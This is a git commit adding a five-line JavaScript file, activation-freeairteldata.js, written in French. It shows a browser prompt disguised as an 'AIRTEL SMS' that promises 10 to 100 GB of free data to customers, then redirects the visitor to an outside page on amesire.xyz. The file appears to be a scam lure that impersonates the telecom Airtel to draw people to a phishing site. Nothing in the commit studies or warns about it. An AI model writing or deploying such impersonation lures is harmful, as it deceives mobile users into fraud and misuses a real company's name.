a758f449a014b6c07dd818cd0b9cd9bdc798abe4
esiditid <amesire247@gmail.com>
2025-08-29 23:12:41 -0700

    Create activation-freeairteldata.js

---
+++ activation-freeairteldata.js
@@ -0,0 +1,5 @@
+var password = 'DONNÉES GRATUITES'
+password=prompt('AIRTEL SMS: Cher client, veuillez vérifier si votre carte SIM Airtel est éligible pour recevoir de 10 Go à 100 Go de données, récompense des clients estimés, appuyez sur Données gratuites pour vérifier maintenant ','DONNÉES GRATUITES');
+if (password != 'DONNÉES GRATUITES') {
+location.href='https://amesire.xyz/freeairteldata.html';
+}
